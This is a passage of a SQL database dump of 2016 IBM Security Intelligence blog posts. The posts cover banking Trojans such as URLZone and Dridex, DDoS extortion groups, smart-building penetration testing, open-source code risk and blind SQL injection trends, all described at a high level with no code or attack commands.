Wolf campaign in “ ” These malware families and other targeted attacks have common elements and components. The IBM X-Force team has analyzed many types of threats, and we are now at a point where we can use the attackers’ forces against them. During “ ,” Etay Maor will review some of the common techniques used in targeted threats, cover how attackers perform information sharing and intelligence collection and discuss counter-strategies based on combining information sharing, intelligence collection and implementation and advanced tools. X-Force researchers have been hard at work turning real-life monitored incidents into actionable insights. Learn more about the evolution of fraud within “ ” with a panel of experts including Nick Bradley, Michelle Alvarez and Robert Freeman. Their discussion will focus on the particular challenges for two industries that rely on reputation and trust for success: finance and retail. In “ ” with Kevin Marker and Daniel Wilson, you can hear more real-life examples of engagements from the X-Force Incident Response elite consultants. They’ll also share industry trends and help attendees better understand the role an external incident response team has within their overall security posture. Sessions on threat intelligence span a range of options from live demonstrations to feedback roundtables. A good overview session is “ .” For more insight on making threat indicators actionable, check out Cameron Will’s session “ .” To explore the social side of security, check out “ ” with me. To really dig deep, you can   or give us feedback on the platform. Join Chris Simmons and myself in one of the two Client Feedback Roundtables on X-Force Exchange or stop by the IBM Security booth in the Expo Hall to see a demo of collaborative defense in action.', '\'IBM InterConnect\', \'IBM X-Force Research\', \'InterConnect 2016\', \'Security Conferences\', \'X-Force\'', 'https://securityintelligence.com/ibm-x-force-security-research-in-the-spotlight-at-interconnect-2016/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (300, 'Custom and Open Source Code: A New Approach to Application Security Management', 'Constantine Grancharov', '2016-2-4', 'Software applications access many of the most important assets organizations manage, such as intellectual property, strategic plans and customer data. This makes them a very lucrative target for cybercriminals. Unfortunately, applications are often the weakest link in the enterprise IT security chain. Recent   have shown that many disclosed security incidents in recent years are the result of application vulnerabilities. The reports indicate that many organizations lack understanding about how to secure their valuable application assets. One area of application security that is frequently overlooked has to do with the use of open-source software. Use of open-source software is ubiquitous across the Web, cloud, containers, enterprise apps, mobile and the Internet of Things (IoT). Analysis from  , an IBM Security partner, showed that open-source code comprises about   of the average commercial software application; this figure can jump even higher for in-house applications. According to  , open source will be included in mission-critical applications within 99 percent of Global 2000 enterprises by the end of 2016. It’s easy to understand why open source is growing in popularity, even among organizations like the U.S. Department of Defense and proprietary software vendors. Free to use, open source provides critical functionality while lowering development costs and accelerating time to market. Open source is not without risk, however. In 2014 alone, the   reported over 4,000 new vulnerabilities, including critical issues such as Heartbleed, Shellshock, Venom and Ghost. Moreover, thousands of open source-related vulnerabilities are likely to be present within existing applications in a typical large enterprise. Unfortunately, most enterprises lack visibility into and control of their open source. You can’t control what you can’t see, and addressing this challenge is critical to the use of open source with trust and confidence. \n Automated security testing has advanced dramatically over the last 10 years. In particular, static and dynamic analysis tools have helped organizations identify common coding mistakes that could result in  . As the technologies advance, more vulnerability types can be detected and quickly remediated. There is, however, still a role for security researchers. Many classes of vulnerabilities remain undetectable by automated tools. Even among those classes of vulnerabilities that are detectable, some are simply too complex for today’s technology. These include the types of vulnerabilities being disclosed every day in open-source components. Open-source software has benefited from the idea that enough people will review open-source code to find most security issues. While the validity of this theory is partially dependent on who is reviewing the code, it appears that the most common security bugs are often identified during the development process. That means the largest vulnerabilities are not present in the final product. However, the reuse of open-source components complicates things. As new vulnerabilities are disclosed, developers must be diligent in checking to ensure they are using the most recent version of an open-source project and patching code whenever necessary. While development teams are increasingly sophisticated about security and are incorporating best practices such as static and dynamic analysis, threat modeling and security requirements into the software development life cycle, the security challenges related to the reuse of components already in the developer’s workspace are often overlooked. Security issues in open source make it a particularly attractive target for attackers. The ubiquity of certain components provides a target-rich environment: The source code is available for manipulation, vulnerabilities are publicly available and there’s a lack of automatic updates. Those elements combine to make   difficult for defenders. Even when organizations are thorough about checking their open-source code prior to deployment, everything changes when a new vulnerability is disclosed. An application once believed to be secure becomes a prime target for even unsophisticated attackers. The good news is that a solution exists. A new   extends IBM’s solution portfolio to include identification, remediation and control of risks in open-source software through an integrated approach to application security management. Black Duck Hub integrates into the build cycle with   to automatically identify all the open-source code used in an application. The resulting inventory or bill of materials is matched to Black Duck’s KnowledgeBase of over 1.5 million open-source components to identify known security vulnerabilities and display the security information directly within IBM Security AppScan Enterprise. Additionally, Black Duck continues to monitor the threat space so that when new vulnerabilities are disclosed, users receive security alerts along with information telling them exactly which applications use the now-vulnerable component. Working together, IBM and Black Duck help application security and development professionals take a comprehensive approach to identifying and remediating security issues in customized and open-source software. To learn more about the importance of Open-Source Testing, read our blog “ .” You can also test drive IBM Application Security on Cloud, by registering for a  .', '\'Application Security\', \'Application Security Testing\', \'Open Source\', \'Vulnerabilities\'', 'https://securityintelligence.com/custom-and-open-source-code-a-new-approach-to-application-security-management/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (301, 'Is Your Smart Office Creating Backdoors for Cybercriminals?', 'Paul Ionescu', '2016-2-3', 'More and more devices are connecting to the Internet; the ones that control your building’s heating, lighting and air conditioning are no exception. According to  , devices in smart homes and smart commercial buildings represented 45 percent of total connected things in use in 2015. Unfortunately, little attention is being paid to the potential cybersecurity risks created by smart office technology since these devices fall outside the scope of traditional IT. In fact, a recent   operators found that only 29 percent had taken action or were in the process of taking action to improve cybersecurity for their Internet-connected systems. If compromised, smart-building devices could have a profound impact on our physical surroundings and could allow a malicious actor to cause damage without any physical access to the building. For example, cybercriminals could gain control of the devices that regulate data center temperatures, causing fans to shut down and servers to overheat. Not only do these connected devices impact our physical surroundings, but if they share connections with enterprise IT networks, they could also open a backdoor to company data. A recent IBM ethical hacking simulation on the smart office shed more light on these risks and vulnerabilities. It also revealed several best practices to keep in mind when it comes to securing smart office and building systems. Did you know it’s very hard to update an embedded device? Think about your thermostat or the software in your furnace. Those aren’t typically things you would be rebooting periodically for a software update. If a security bug was found, the best way to apply a fix would be to replace the thermostat. But the types of interconnected thermostats used in building automation aren’t exactly cheap. How about software security practices? Many embedded devices are designed for networks that are completely isolated from the outside world, and therefore, authorization controls for these systems are often very lax, if they exist at all. The administrative Web interfaces for these systems aren’t expected to sustain the type of attacks you’d see on a publicly facing website. In many cases, they aren’t even protected by basic security controls and devices. Today’s connected building implementations were not contemplated by some device manufacturers. For example, the building automation system can be set up with a multitude of stations connecting to a central control server. The technicians can log into the central server to obtain real-time access to sensor data and control various devices of the station. Below is a diagram that shows how a connected BAS is typically set up. Notice that the stations go through the Internet to connect to the central server. In many cases, operators may use virtual private network (VPN) and firewall devices with access rules to secure this connection. In some cases, however, these measures may be skipped. Because technicians need to be able to share access to the stations, the passwords may be easy to guess, usually following some pattern that is internally known. These passwords may never be changed, and many devices in the station   may be configured with the same password. To avoid travel, the technicians may also enable additional administrative interfaces such as router or controller Web interfaces. While the design of these systems makes them a potential hacking target, many of these vulnerabilities and risks remain unknown to building system operators and property management. To drive more awareness of these risks and learn how they could impact systems in real life, IBM Security’s X-Force Ethical Hacking team conducted a pen test to break into a building automation system to find out what kind of software flaws we could uncover and whether traditional   can help secure these devices. We offered our services to a building management team who was more than happy to have us to try to break in. In fact, they asked us to test whether we could break into their main monitoring and control server, which controls several other locations in North America. During the engagement, we found that all the security concerns outlined above were justified. The devices were directly connected to the Internet, they had several previously unknown security vulnerabilities, they were sharing passwords, and through public Internet access to administrative interfaces, we were able to break into the main central control server. At a high level, here’s how we were able to accomplish the hack: With control of the central BAS server, a malicious actor could tamper with the physical conditions of all the buildings controlled by this system. This type of control could lead to destruction of IT property by overheating data centers as well as impacting the physical comfort and safety of employees. Thankfully, through the results of the experiment, we were able to bring these issues to the attention of BAS operators and device manufacturers, who patched the software vulnerabilities and made sure that the system itself was updated to prevent future hacks. That said, we learned firsthand that patching a building automation system is no easy feat, given the complex ecosystem of software, devices and ownership involved. The largest issue impacting   is that there is no easy way to patch a building. In our project, it took extensive work and coordination to not only get the vulnerabilities patched, but also to make sure those fixes actually made their way into the affected devices in the building. There are several steps that building automation management companies and manufacturers can do to improve security at a basic level: Changing mindsets, policies and technologies to create secure connected buildings will take time, effort and investment. In the meantime, companies must start paying attention to the potential cybersecurity risks within their physical spaces in order to protect their building, employees and data. Continued research in this field will be critical to raise awareness about a growing problem with potentially catastrophic consequences.', '\'Connected Devices\', \'Hacking\', \'Internet of Things (IoT)\', \'Security Intelligence\', \'X-Force\'', 'https://securityintelligence.com/is-your-smart-office-creating-backdoors-for-cybercriminals/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (302, 'Organized Cybercrime Big in Japan: URLZone Now on the Scene', 'Limor Kessem', '2016-2-1', 'Four months after an organized cybercrime group started using the sophisticated   against Japanese banks, IBM X-Force researchers reported on a second gang setting its sights on Japanese customers with the help of the  . Now, not a month later, a third well-known cybercrime group has moved to attack 14 major Japanese banks: The URLZone team. In what’s marking a definite trend in cybercrime migration, the move of this third organized group to attack banks in Japan is a clear indication of an evolving fraud infrastructure in the country. Why are these organized crime groups spreading to Japan? In most cases of malware migration, cybercriminal groups with adequate resources are looking for easier money, less security and an element of surprise. They may be counting on all these factors to see more success in their attacks, especially as they target the less-aware Japanese customers who are not as experienced with encountering cybercrime as their Western counterparts. Japan has enjoyed some protection from most cybercrime for many years because of its linguistic specificity. While fraudsters were easily able to translate texts into English, even if imperfect or lacking, the same task was trickier when it came to Japanese. Another aspect that kept most cybercriminal factions out of Japan is the likely lack of a local infrastructure for Web fraud, which would require money mule recruitment in Japanese and local rogues to help criminals understand the banking and payment systems. Tools and building contacts in Japan would cost cybercriminals time and money; this is often an investment they could not or did not wish to afford. The smaller Trojan-operating factions from Eastern Europe typically attack locales in which they already have resources and may not invest in building tools and a localized team for fraud in a unique language zone such as Japan. With organized crime in the pictures, the grace period for Japan has ended. Although other malware such as   did target banks in the country, it was not until the launch of Shifu attacks that it became obvious Japan was in trouble. When it comes to organized cybercrime, Shifu’s operators laid the foundations for what came next. Why would a Trojan like Shifu pave the way for other attackers? According to information from actual attack campaigns, IBM X-Force researchers noted that organized cybercrime gangs share resources and buy tools from one another or from the same black-hat vendors. Once Shifu’s group had the infection scheme set up to attack in Japanese, as well as webinjections and localized knowledge about banks in the country, much of the work was already done for other gangs who could now invest in entering the new turf. Unfortunately, cybercrime is a thriving business, and gangs are out there to make money, sometimes in furtive collaborations with one another. Take, for example, the Rovnix Trojan. When this malware began attacking in Japan in December 2015, it unsurprisingly opted to infected users with email spam and not its usual malvertising or drive-by downloads. This is the same way Shifu infected victims in Japan. There are other similarities beyond using emails in Japanese. Rovnix’s developers seemed to draw on Shifu’s existing attack schemes and webinjections, perhaps by analyzing them and then applying some additional elements. These tactics are not a rarity: In October 2015, IBM X-Force researchers noted that Dridex was emulating some of Shifu’s attacks in the U.K., and Shifu was using the same webinjections deployed by Neverquest. \n In January 2016, the URLZone gang officially joined the roster of attackers targeting Japanese banks. This evolution happened within a matter of two weeks from the Rovnix case. Again, the same infection method was selected: email spam containing a poisoned attachment. The malware itself is considered sophisticated and complex, but the current target list and webinjection set appear basic and may have been developed or bought from a specialized black-hat vendor. Since the URLZone group is coming into Japan after other gangs have already set up shop in the country, it is very likely they would be able to rely on mule accounts and trusted rogue agents to work with locally. URLZone, a banking Trojan also known as Bebloh and Shiotob, was first detected in the wild in 2009 when it was attacking German banks. Right from the start, this banking Trojan was considered to be one of the most advanced due to special techniques to conceal malicious activity from both users and researchers,   reported. For example, after robbing accounts of almost their entire balance, URLZone uses HTML injections to replace the balance and hide the transaction line from the victim’s online banking account view. Moreover, to hide its mule account list from researchers, the malware would validate each infected machine to ensure it is indeed part of its botnet and only then provide a mule account for the illicit transactions it carries out. If the infected machines did not pass the test, URLZone’s command-and-control (C&C) server would send back unrelated bank account numbers to keep researchers and banks confused. This capability was rather unique to URLZone and considered one of its more interesting tricks. While currently there are two separate versions of URLZone in the wild, the Trojan is reported to have always been the property of a closed cybercrime group that uses it to defraud the customers of European banks, according to  . In 2009, using the LuckySploit exploit kit to infect victims, URLZone managed to rob banks of more than $500,000 in less than a month. From 2009 to 2013, URLZone was used in what was considered low-volume campaigns because it would typically target banks only in Germanic countries. In 2013, the Trojan saw a version upgrade that included the addition of evasion techniques, anti-VM features and a persistence mechanism. Between 2013 and 2015, this Trojan and the gang that operates it continued to be active in low volumes and, for most of 2015, fell nearly silent. The situation changed in August 2015, when IBM X-Force researchers discovered a new version upgrade for URLZone. Changes to the malware updated its evasion techniques to avoid research tools. The Trojan was also fitted with a new configuration file designed to target banking customers in the U.K., Italy, Poland and Croatia. URLZone has seen increased activity since August 2015 both in terms of attacks and code updates. In December 2015 it began attacking banks in Spain, and in January 2016 it received an upgrade to target Japanese banks. The new URLZone configuration continues to attack banks in Spain, although to a lesser extent in terms of the number of brands targeted. The top features that enable URLZone to defraud online banking customers include: In terms of URLZone’s ranking on the global malware list this year, IBM Security data showed that this malware has not yet cracked the top 10. So far, URLZone’s global reach is limited because it usually attacks in one or two countries at a time. The chart below shows the top offenders on the financial malware roster from January 2015 to January 2016. IBM Security X-Force has worked with customers to study and stop URLZone attacks and can be of help to banks that wish to learn more about this high-risk threat. To help stop threats like URLZone, banks and service providers can use adaptive solutions to detect infections and   when malware migrates or finds new focus in the organization’s region. On the bank’s side, fighting evolving threats — such as URLZone’s attacks — is made easier with the right  . With protection layers designed to address the ever-changing threat landscape, financial organizations can benefit from malware intelligence that provides real-time insight into fraudster techniques and capabilities. Sample MD5 analyzed by IBM X-Force researchers: b24dec9f053f8e3ff698aea4e4eb4ccd.', '\'Advanced Threats\', \'Banking Trojan\', \'IBM X-Force Research\', \'Malware\', \'Online Banking\', \'Rovnix\', \'Shifu\', \'Threat Intelligence\', \'Trojan\', \'URLZone\', \'X-Force\'', 'https://securityintelligence.com/organized-cybercrime-big-in-japan-urlzone-now-on-the-scene/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (303, 'Pay Us the Money or the Website Gets It: Extortion by DDoS', 'Martin McKeay', '2016-1-28', 'Receiving an extortion letter instructing to “pay us in bitcoins or your site will suffer a distributed denial-of-service (DDoS) attack” has become almost commonplace in the last two years. They say there’s nothing new under the sun, and this applies to the Internet just as much as anything else. As soon as businesses realized there was money to be made by having a website and selling things, other people realized that there was money to be made by taking it down or threatening to do so. It’s an old cycle that has happened every time a new method of making money has been discovered. Over the last 24 months,   have become a favorite tool for extortion. Extortion by DDoS is old hat for those in the online gaming and gambling sectors. In the late 1990s, as the fledgling Internet started gaining traction, one of the biggest concerns for organizations was DDoS attacks. If your site was offline, customers would rather go check out one of your competitors than wait for it to be available again, and some of them never return. Later, it was the hospitality sector — hotels and other online booking services — that started suffering attacks. While these strikes weren’t uncommon, they also weren’t newsworthy, in part because businesses downplayed their impact and their effects were still relatively minor to businesses in the grand scheme of things. Over the last couple of years, things have changed — and not for the better. In September 2014, a group calling themselves DD4BC (DDoS for Bitcoin) began sending CFOs and CSOs emails stating, “Pay us or else,” and threatening to bring hundreds of gigabits per second of traffic to bear against the organization. Many companies discounted the emails only to see their sites impacted by the promised traffic, first for a short burst of time and later for an extended length, though mostly in the megabit range rather than the gigabit. While there’s nothing more than rumors of organizations paying the extortion demands, the fact that DD4BC kept up the attacks until July 2015 suggested there was enough money being made to continue the efforts. Though DD4BC stopped their attacks for reasons unknown, it doesn’t mean we’ve seen a decrease in the use of DDoS for extortion. In fact, a number of copycats have sent out emails mimicking DD4BC over the past year. One new group calling itself the Armada Collective arrived on the scene in October. Using similar tactics to DD4BC, the Armada Collective demands approximately $5,000 to $10,000 in bitcoins to an anonymous account or an organization will be hit with more than 1 terabit per second of traffic. A short demonstration of 15 minutes or fewer is then performed. If the extortion isn’t paid, a longer attack commences, with the cost to stop going up. The most recent high-profile target of the Armada Collective has been secure mail services such as  . The   (full disclosure: I work for Akamai) has been tracking this new organization and believes that the Armada Collective is a copycat group distinct from the earlier DD4BC. While the threat letter promises an attack of 1 Tbps, the reality of the group’s capabilities is quite a bit more modest. The initial attacks by the group were under 1 Gbps, though more recent attacks have been larger, topping out at just over 50 Gbps in the case of ProtonMail. The majority of this traffic is generated by spoofing the IP address of the target and reflecting network protocols, such as DNS and NTP, off vulnerable servers around the Internet, but there is also application layer traffic in the mix. \n These attacks aren’t isolated examples or one-time events. Multiple other secure mail services have received the same threats, and blogger   even came under attack after writing about the Armada Collective. For every one of these publicly acknowledged targets, it’s likely there are multiple extortion recipients who won’t disclose that they’ve been threatened. It’s also highly likely that the Armada Collective has moved on from large organizations who can afford the   to smaller organizations that might not have the expertise or systems to protect themselves — they would rather pay to make the attacks go away. Companies should develop a plan for cyberattacks that is both proactive and responsive, placing them in a position to effectively defend against DDoS attacks. In my opinion, paying a ransom is a mistake. ProtonMail paid and the attacks continued, though the Armada Collective claims it was a second group that picked up the charge. Whether this is true or not, paying organizations like DD4BC or the Armada Collective only encourages them to continue their attacks. They may stop attacking your organization in the short term and move on to other targets, but groups like these talk to each other. Once it’s known that your organization will pay, the odds of becoming the target of another attack increase greatly. It is unlikely that the   is going to come to an end anytime soon. The tools needed to attack your site are cheap and easy to use. That attack that you’re being asked to spend $6,000 to stop probably only costs the attacker $40 an hour to launch, meaning every time a business pays, it’s funding 150 hours of attacks on other targets. Paying attackers fuels their capabilities and makes it more likely they’ll continue to attack businesses globally. There are multiple ways to proactively prevent DDoS attacks, from on-premises equipment to solutions offered by ISPs and cloud-based services that fight the attacks at their data center rather than yours. Reaction to online extortion shouldn’t be any different than if you experienced it in the real world: Contact law enforcement and prepare your defenses.', '\'Advanced Threats\', \'Cyber Extortion\', \'Extortion\'', 'https://securityintelligence.com/pay-us-the-money-or-the-website-gets-it-extortion-by-ddos/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (304, 'Top Four Reasons to Attend InterConnect 2016', 'Security Intelligence Staff', '2016-1-25', 'One of this year’s must-attend events is coming soon to the MGM Grand and Mandalay Bay in Las Vegas. From Feb. 21–25,   will showcase the latest offerings from IBM, including security solutions for cloud and mobile environments,  , endpoints and applications.  is very excited about this comprehensive and collaborative event. These are the top four reasons we think you should join us there. Enjoy access to hundreds of our solution specialists and distinguished engineers, as well as IBM clients and business partners, all of whom will be sharing their best practices, insights and analysis on the latest security trends and issues. With over 1,500 sessions and 200 labs, there will be ample learning opportunities each day. You’ll even find certification opportunities, hands-on labs and special training available. Whether you’re an executive, IT leader, developer, designer, architect or cloud expert, you should attend InterConnect 2016. You’ll not only meet and mingle with industry peers and professionals, but also learn about IBM’s integrated security solutions and services suite. Whether your company is trying to optimize its existing infrastructure, leverage a hybrid environment or go through a digital transformation, we will have authorities on-site to show you the products, solutions and capabilities needed to achieve your goal. As the premier security, cloud and mobile  , InterConnect 2016 will draw more than 24,000 attendees, giving all participants the chance to network. They’ll also have the opportunity to discover how security is vital for organizations looking to adapt in the era of Internet of Things (IoT) and cognitive data. At the event, you can join IBM and   in helping prepare and package 285,000 meals. IBM donates the meals and provides the packing space, Stop Hunger Now pays the shipping, you donate the necessary labor and thousands of children receive nutritious meals.', '\'IBM InterConnect\', \'Security Conferences\', \'Security Intelligence\'', 'https://securityintelligence.com/top-four-reasons-to-attend-interconnect-2016/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (305, 'Malware: Bigger and Badder Than Ever', 'Jennifer Tullman-Botzer', '2016-1-22', 'Anyone who kept up with cybersecurity news in 2015 already knows it was a big year for malware and the cybercriminal gangs that develop it. Malware sophistication reached new heights with  ,   and other gang-owned codes, revealing that the stereotypical   has been replaced by highly organized cybercrime. Indeed, today’s fraudsters are very professional and focused, and they are diversifying their targets in order to achieve bigger paydays. With all the advances made in cybercrime throughout recent months, there is little reason to suspect that the evolution of increasingly complex malware strains and the magnitude of cybercriminal activity will slow down in 2016. In a new   released by the Information Security Media Group, IBM Security Executive Security Advisor   discussed how malware evolved in the past year, the variants that concern her most and where organizations are now most vulnerable to attack. In 2015, existing Trojans added new evasion features and theft mechanisms. New malware that emerged was increasingly modular and advanced, meaning it was able to better impersonate victims and hide its intentions in real time. Perhaps most alarmingly, this growing sophistication has revealed itself not only in banking Trojans, but also in   realms, as well. One trend to watch in the mobile arena, Kessem cautioned in the paper, is overlay malware. In an overlay attack, fraudsters place a nearly identical fake application screen on top of a legitimate application, deceiving users into revealing personal data such as payment terminal logins, banking credentials or even credit card details. With cybercriminals becoming more organized and developing more sophisticated and dangerous malware tactics, it’s no surprise that traditional defenses are struggling to keep up. As just one example, antivirus software cannot reliably detect morphed or rewrapped malware and therefore leaves the endpoint open to exploitation. This stronghold, whether on a personal or corporate device, is where the eventual fraud takes place. Kessem emphasized that, in a world where malware evolves both rapidly and frequently,   must also be based on dynamic intelligence. Counteracting the most advanced malware codes requires an agility that is lacking in many current solutions.', '\'Advanced Threats\', \'Malware\', \'Security Intelligence\', \'Threat Intelligence\'', 'https://securityintelligence.com/malware-bigger-and-badder-than-ever/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (306, 'Is Your Antivirus Software Vulnerable to Attack?', 'Rick M Robinson', '2016-1-21', 'It sounds like a plot hook for a sci-fi thriller: Attackers take over security safeguards and then use the compromised guardians to break into facilities and engage in theft, sabotage or both. But according to some security researchers, this isn’t just a fictional Hollywood scenario. Popular   used by thousands of enterprises and millions of individual users is potentially vulnerable to attack.\n Because these attacks take control of software intended for security protection, the attackers can bypass other protective measures, covering their tracks. They can even use the security tools to do further damage such as infecting other systems. Unlike many threat vectors, these attacks do not depend on end user shortcomings.\n The good news, according to Lucian Constantin at  , is that there is no direct evidence — so far — that antivirus solutions have been used in attacks. If such attacks have taken place, they were small in scale and avoided detection. But security researchers warned that such strikes are possible.\n Both the U.S. National Security Agency (NSA) and British intelligence agencies are known to have examined popular commercial antivirus software packages to look for ways they could break into systems protected by these packages,   reported. It stands to reason that other international intelligence agencies, some with reputed ties to cybercrime groups, are also actively examining antivirus software for potential vulnerabilities.\n The major cybersecurity firms that market these tools are well aware of the potential risks to and from their products. “Attacks on security researchers and security vendors could be a future trend in information security,” Vyacheslav Zakorzhevsky of Kaspersky Lab told InfoWorld. “However, we do not believe these will be widespread attacks.”\n But who will guard the guards themselves? As this Latin proverb suggests, the security challenges of safeguarding protective systems are not new. In fact, they are inherent in the nature of security measures.\n Security guards need passkeys, which means that one way for the bad guys to get hold of those keys is to steal them from a guard. In the same way, security software needs to have access to high-level permissions. In fact, most of the familiar Hollywood tricks for getting past the guards have their cyber equivalents, from simply taking out a guard (disabling the software) to dressing up in a guard uniform and issuing fake instructions (abusing the software’s system permissions).\n This basic challenge is inherent to antivirus protections; because this software must examine a wide variety of incoming data and file types, and have multiple internal security components, the solutions have a large attack surface. They can be attacked in many ways at many points.\n Some security researchers questioned whether the whole idea of security based on  , which is what antivirus software provides, is obsolete in the modern world of richly interconnected systems. Others may claim that much security software development is flawed because tools are not adequately sandboxed, or protected against unwanted outside interactions.\n But it is not clear that sandboxing is practical for complex security packages. They might end up with so much self-protection that it would grind everything to a halt, making them unusable.\n Other security researchers argued that antivirus software is just one layer of protection and perhaps more important to individuals and small businesses than to enterprises that have the resources — including human resources — to deploy other types of  . For nearly all users, installing software updates and patches is the single most important security measure.\n The fact is that antivirus software is indeed one layer of protection, not a complete security solution in itself. The security risks it poses are not peculiar to those tools but are inherent in any security system powerful enough to protect you. Effective security comes from being proactive, building in multiple levels of protection from the ground up and taking nothing for granted.', '\'Antivirus\', \'Endpoint Protection\', \'Security Intelligence\', \'Vulnerabilities\'', 'https://securityintelligence.com/is-your-antivirus-software-vulnerable-to-attack/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (307, 'Dridex Launches Dyre-Like Attacks in UK, Intensifies Focus on Business Accounts', 'Limor Kessem', '2016-1-19', 'IBM X-Force researchers have been following new developments in the Dridex Trojan’s attack methodologies. In their latest alert, researchers divulged a new modus operandi launched by Evil Corp, the cybercrime group that owns and operates the Dridex banking Trojan. Dridex recently released a new malware build with some internal bug fixes. The new version, v196769, which is v.3.161, was first detected on Jan. 6, 2016. The release of the new build was immediately followed by an infection campaign that used the   to deliver malware to would-be victims. Campaigns are mainly focused on users in the U.K. Recipients who received Dridex spam got a Microsoft Office file attachment purporting to be an invoice via email. The file contained poisoned macros that, once enabled, launch the exploitation and infection process of the Dridex Trojan. The resulting communications appear to be taking place with Dridex’s sub-botnet No. 220. X-Force researchers studied the attacks linked with the new Dridex infection campaigns and learned that the malware’s operators have made considerable investments in a new attack methodology. The new scheme is not entirely novel; it copies the concept of the   redirection attack scheme. The difference between Dyre and Dridex is the way in which the redirection takes place: Dyre redirects via a local proxy, while Dridex redirects via local DNS poisoning. The overall idea behind redirection attacks is to send the infected victim to an entirely new website when they try to browse to their online banking site, never allowing them to reach the bank’s real site. By keeping the victim away from the bank’s site, the fraudster can deceive them into divulging critical authentication codes without the bank knowing that the customer’s session has been compromised. To prepare for such a redirection attack, the cybercrime gang needs to invest heavily in creating website replicas of targeted banks. When Dyre started using this scheme, it was targeting over a dozen banks — a rather resource-intensive operation that eventually drove Dyre’s operators to switch back to using webinjections and page replacements. Once the site replicas are ready, the Trojan causes an immediate redirection of victims’ HTTP requests and sends them to a new, impostor URL without any visual clue or visible delay. Dyre used a local proxy to do this, and Dridex now uses DNS poisoning on the local endpoint to redirect the victim to pages it controls. In DNS cache poisoning, an attacker inserts a fake address record for an Internet domain into the endpoint’s cache DNS. As a result, the cache will use the fake address in subsequent browsing requests and route traffic to the address of the attacker’s server. For as long as the fake entry is cached by the server, browsers or email servers will automatically send victims to the address provided by the compromised DNS server. Visually, the victim sees the site replica and the correct URL in the browser’s address bar. They won’t typically suspect that anything happened and will proceed to log in as usual. However, since the victim has never actually reached the bank’s website, the bank’s server does not see the login and has no information on the session. After the initial session authentication on the fake website, the victim is presented with injections that instruct him or her to provide two-factor authentication transaction codes (e.g., tokens, second passwords, replies to secret questions, etc.). Those details are harvested by the Trojan, sent to the command-and-control server and then automatically checked for validity on the bank’s genuine website in real time. If the login credentials are valid, the fraudsters can conduct a fraudulent transaction from their own endpoint via account takeover. The fraudsters initiate the illicit transaction while the victim is being delayed by the social engineering injections on the fake site. If the fraudsters lack any details or face additional challenges on the bank’s website, they use more injections to solicit the victim’s assistance. In cases of successful information harvesting, the money is moved from the victim’s account to a mule account. At the initial phase of the new redirection attacks, Dridex’s operators only targeted two banks in the U.K. Within a week, that list expanded to include 13 banks, all of which are based in the U.K. It is possible that Dridex started with testing on the first two banks and then, once the other site replicas were ready, added more banks to its target list. Dridex seems to be heavily inspired by the Dyre Trojan, and it is not impossible that the two groups share some key developers or management. It’s therefore possible that Dridex borrowed or bought the site replicas from the Dyre group and moved to the new attack method in the same geography where Dyre used it before. Dridex also continues to scale up in victim quality. The bank URLs on the target list are, for the most part, the dedicated subdomains for business and corporate account access. By targeting the   in each bank, Dridex’s operators are clearly planning to make   out of business accounts and are less enticed by personal banking. \n Dridex’s ranking on the global malware list has been consistent throughout 2015 and shows it is one of the dominant threats. IBM X-Force data indicated that Dridex is one of the top three most active banking Trojans in the world, even after closely escaping a   in October 2015. The chart below shows Dridex’s ranking among the top offenders on the financial malware roster for the year of 2015, according to IBM Security Trusteer. IBM X-Force researchers expect Dridex to maintain its dominance in the cybercrime arena this year. At the time of this writing, the Dridex sample analyzed by IBM X-Force is only properly detected by four antivirus vendors out of 56, according to  . IBM Security Trusteer has worked with customers to study and stop Dridex attacks. It can be helpful for banks that wish to learn more about this high-risk threat. To help stop threats such as Dridex, banks and service providers can use adaptive solutions to detect infections and   when malware migrates or finds new focus in a region. On the bank’s side, fighting evolving threats — such as Dridex’s redirection attacks — is made easier with the right  . With protection layers designed to address the ever-changing threat landscape, financial organizations can benefit from malware intelligence that provides real-time insight into fraudster techniques and capabilities. Sample MD5:  b24dec9f053f8e3ff698aea4e4eb4ccd', '\'Banking Trojan\', \'Dridex\', \'Dyre\', \'Fraud\', \'IBM X-Force Research\', \'Malware\', \'Online Banking\', \'X-Force\'', 'https://securityintelligence.com/dridex-launches-dyre-like-attacks-in-uk-intensifies-focus-on-business-accounts/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (308, 'Blind SQL Injection: The Last Handkerchief Up the Attacker’s Sleeve', 'Dave McMillen', '2016-1-19', 'For as long as SQL injection has been around, it is still   — at least for attackers. Attackers will take whatever path they can to reach an exploit The simpler the path, the better. However, sometimes they need to use a little more elbow grease. That’s where blind SQL injection comes in. If an attacker were a magician, this attack would be the last handkerchief out of his SQL injection sleeve. The   gave the following definition of blind SQL injection: This is called a blind attack because the actor can’t easily see the intended target without asking the important questions. An attacker typically uses blind SQL injection if traditional methods continually fail to glean information. Blind injection is a last resort.  continuously monitors billions of events reported every year by client devices in over 100 countries. Analysis of the blind SQL injection data accumulated between Jan. 1, 2015, and Nov. 30, 2015, revealed some interesting findings.\n \n Clearly, traditional SQL injection attempts win out over blind SQL injection attempts, but there are some months when attackers make a concerted effort against their targets to use blind SQL injection.\n Without investing time into testing, it’s virtually impossible to tell if your database deployment and its front-end infrastructure are vulnerable to blind SQL injections. SQL injection testing tools can help organizations identify SQL   — but attackers can use those same tools to find entry points into the same applications.', '\'Cybercriminals\', \'IBM Managed Security Services (MSS)\', \'SQL Injection\'', 'https://securityintelligence.com/blind-sql-injection-the-last-handkerchief-up-the-attackers-sleeve/');
